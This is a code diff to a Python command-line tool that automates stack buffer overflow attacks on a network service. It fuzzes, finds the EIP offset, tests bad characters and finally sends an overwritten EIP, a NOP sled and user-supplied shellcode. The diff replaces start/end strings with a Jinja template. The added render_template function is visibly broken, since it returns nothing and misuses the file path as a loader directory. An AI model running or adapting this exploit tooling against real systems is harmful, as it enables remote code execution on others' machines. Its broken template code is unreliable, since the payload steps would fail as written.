@@ -2,21 +2,22 @@
 
 import socket, time, sys, argparse, subprocess
 
+import jinja2
+
 def main():
 
   # Parse the command line arguments
   parser = argparse.ArgumentParser(description='Python based fuzzer with lots of options')
-  parser.add_argument('-a', '--action', choices=["fuzz", "pattern", "offset", "chars", "verify", "exploit"], help="What action you want to perform on the application, either a fuzz, a pattern create, offset determination, or bad characters")
+  parser.add_argument('-a', '--action', choices=["fuzz", "pattern", "offset", "chars", "verify", "exploit"], help="What action you want to perform on the application, either a fuzz, a pattern create, offset determination, bad character identification, verification of EIP, and exploitation")
   parser.add_argument('-i', '--ip', type=str, help="IP address of system to fuzz", required=True)
+  parser.add_argument('-T', '--template', type=str, help="A jinja template that will be used in building the payload for the exploit", required=True)
   parser.add_argument('-p', '--port', type=int, help="Port number of service/application to fuzz", required=True)
-  parser.add_argument('-s', '--start', default="", type=str, help="(DEFUALT = None) Start of the string you want to send to application")
-  parser.add_argument('-e', '--end', default="", type=str, help="(DEFUALT = None) End of the string you want to send to application")
   parser.add_argument('-l', '--length', type=int, help="Length of the pattern you want to send")
   parser.add_argument('-q', '--query', type=str, help="Value found in EIP when debugger crashed from the pattern create")
   parser.add_argument('-x', '--exclude', default="", type=str, help='(FORMAT = "0f83e189") The chars to exclude in bad char test')
   parser.add_argument('-o', '--offset', type=int, help="The offset of the EIP")
-  parser.add_argument('-r', '--eip', type=str, help='(FORMAT = "0f83e189") The new EIP value you want to send in your payload as a string')
-  parser.add_argument('-c', '--shellcode', type=str, help='The /path/to/shellcode you want sent in the buffer')
+  parser.add_argument('-e', '--eip', type=str, help='(FORMAT = "0f83e189") The new EIP value you want to send in your payload as a string')
+  parser.add_argument('-s', '--shellcode', type=str, help='The /path/to/shellcode you want sent in the buffer')
   parser.add_argument('-t', '--timeout', default=2, type=int, help='(DEFAULT = 2s) How long the timeout should be for the connection')
   args = parser.parse_args()
 
@@ -24,8 +25,7 @@ def main():
   action = args.action
   ip = args.ip
   port = args.port
-  start = args.start
-  end = args.end
+  jinja_template = args.template
   length = args.length
   query = args.query
   exclude = args.exclude
@@ -34,12 +34,9 @@ def main():
   shellcode = args.shellcode
   timeout = args.timeout
 
-  # Convert some of the args
-  start = sanitize_string(str.encode(start, 'utf-8'))
-  end = sanitize_string(str.encode(end, 'utf-8'))
-
-  print(f'[*] Start Value: {start}')
-  print(f'[*] End Value: {end}')
+  # Load the template
+  print(f'[*] Loading jinja template from {jinja_template}')
+  render_template(jinja_template, {})
 
   # Helper functions
   def socket_send(payload, print_before="", print_after=""):
@@ -54,13 +51,7 @@ def main():
 
   def print_next_posssible_command():
     print('[*] Possible next command:')
-
-    try:
-      script = f'    ./biff-the-buffer.py -i {ip} -p {port} -s "{start.decode("utf-8")}" -e "{end.decode("utf-8")}"'
-    except:
-      print('[X] Tried encoding start and end, but failed due to unprintable chars being present')
-      print('[X] Printing byte string in their place instead, which will need to be modified')
-      script = f'    ./biff-the-buffer.py -i {ip} -p {port} -s "{start}" -e "{end}"'
+    script = f'    ./biff.py -i {ip} -p {port} -T {jinja_template}'
 
     # Determine which action was used
     if (action == 'fuzz'):
@@ -79,17 +70,14 @@ def main():
   # Create string to send to app
   if action == 'fuzz':
     inc = 1
-    string = start + b"A" * 100 + end
-
     while True:
       num_bytes = 100 * inc
-      string = start + (b"A" * num_bytes) + end
-      current_length = (len(string) - len(start))
+      string = render_template(jinja_template, b"A" * num_bytes)
       try:
-        socket_send(string, f"[*] Fuzzing with {current_length} bytes")
+        socket_send(string, f"[*] Fuzzing with {num_bytes} bytes")
       except:
-        print(f"[*] Fuzzing crashed at {current_length} bytes")
-        length = current_length
+        print(f"[*] Fuzzing crashed at {num_bytes} bytes")
+        length = num_bytes
         print_next_posssible_command()
         sys.exit(0)
       inc += 1
@@ -98,7 +86,7 @@ def main():
   elif action == 'pattern':
     if (length is None): raise Exception("[X] Must supply a length if using pattern")
     pattern = create_pattern(length)
-    string = start + pattern + end
+    string = render_template(jinja_template, pattern)
     try:
       socket_send(string, f"[*] Sending pattern of size {length}", "[*] Patern sent")
     except:
@@ -108,15 +96,15 @@ def main():
     if (offset is None): raise Exception("[X] Must supply an offset if using chars")
     try:
       all_chars = get_all_bytes(excluded_bytes=bytes.fromhex(exclude))
+      mal_payload = render_template(jinja_template, b'A' * (offset))
       payload = [
-        start,
-        b'A' * (offset),
-        end,
+        mal_payload,
         b'B' * (4),
         all_chars
       ]
+
       payload = b"".join(payload)
-      socket_send(payload, f"[*] Sending all possible bytes (length={len(payload)} bytes)", "[*] All possible bytes sent")
+      socket_send(payload, f"[*] Sending all possible bytes (length={len(mal_payload)} bytes)", "[*] All possible bytes sent")
     except:
       print("[*] Check your debugger for a crash")
       print_next_posssible_command()
@@ -141,14 +129,12 @@ def main():
     if (offset is None): raise Exception("[X] Must supply an offset if using verify")
     print(f"[*] Verifying the offset and seding additional data")
 
-    # Build the payload
     payload = [
-      start,
-      b"A" * (offset), # The overflow
-      end,
+      render_template(jinja_template, b'A' * (offset)),
       b"B" * 4, # The new EIP
-      b"C" * 1000, # The Stack 
+      b"C" * 1000 # The Stack 
     ]
+
     payload = b"".join(payload)
     try:
       socket_send(payload, "[*] Sending verification payload", "[*] Payload sent")
@@ -189,14 +175,14 @@ def main():
 
     # Build the payload
     print("[*] Building full payload")
+    
     payload = [
-      start,
-      b'A' * (offset),
-      end,
+      render_template(jinja_template, b'A' * (offset)),
       eip,
       b'\x90' * 16,
       shellcode_string
     ]
+
     payload = b"".join(payload)
     try:
       socket_send(payload, "[*] Sending shellcode")
@@ -233,6 +219,12 @@ def sanitize_string(byte_string):
     escaped_byte_string = str.encode(string_rep_of_byte)
     byte_string = byte_string.replace(escaped_byte_string, byte_val_string)
   return byte_string
+
+def render_template(path, payload):
+  template_loader = jinja2.FileSystemLoader(searchpath=path)
+  template_env = jinja2.Environment(loader=template_loader)
+  template = template_env.get_template(path)
+  template.render({ "payload" : payload })
 
 if __name__ == "__main__":
   main()
